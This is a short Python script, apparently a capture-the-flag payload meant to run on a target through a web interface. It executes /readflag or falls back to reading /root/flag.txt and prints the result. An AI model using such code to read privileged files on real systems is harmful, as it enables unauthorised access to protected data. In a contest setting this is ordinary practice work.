import subprocess, sys, os

def show(b: bytes):
    # Keep stdout minimal so the web UI shows only the flag
    sys.stdout.write(b.decode("utf-8", errors="ignore"))

def run(cmd):
    return subprocess.check_output(cmd, stderr=subprocess.STDOUT)

try:
    if os.path.exists("/readflag"):
        show(run(["/readflag"]))
    else:
        # Fallbacks (harmless if they fail)
        for cmd in (["cat","/root/flag.txt"], ["bash","-lc","/readflag"]):
            try:
                show(run(cmd))
                break
            except Exception:
                pass
except Exception as e:
    # Keep errors terse so we don’t drown the flag
    print("ERR:", e)
